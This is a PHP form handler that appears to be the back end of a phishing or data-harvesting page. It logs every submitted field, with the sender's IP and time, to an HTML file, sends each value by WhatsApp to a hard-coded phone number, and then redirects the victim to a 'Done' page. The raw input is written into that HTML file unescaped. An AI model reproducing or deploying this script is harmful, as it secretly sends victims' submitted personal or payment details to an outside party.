<?php

header ('Location: Done.html ');
$handle = fopen("orders.html", "a"); 
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("j F, Y, g:i a");
foreach($_POST as $variable => $value) {
    fwrite($handle, "----------------------- <br> \r\n");
    fwrite($handle,'date='. $date.'<br>');
    fwrite($handle, "\r\n");
    fwrite($handle,'ip='. $ip.'<br>');
    fwrite($handle, "\r\n");
    fwrite($handle, $variable);
    fwrite($handle, "= ");
    fwrite($handle, $value);
    fwrite($handle, "");
    include('WhatsappAPI.php'); // include given API class and update API credentials in it
    $obj = new WhatsappAPI; // create an object of the WhatsappAPI class
    $status = $obj->send("+905314723936", "$date %0A $ip %0A $variable = $value" ); // NOTE: Phone Number should be with country code
    $status = json_decode($status);
}
fwrite($handle, "<br>");
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>

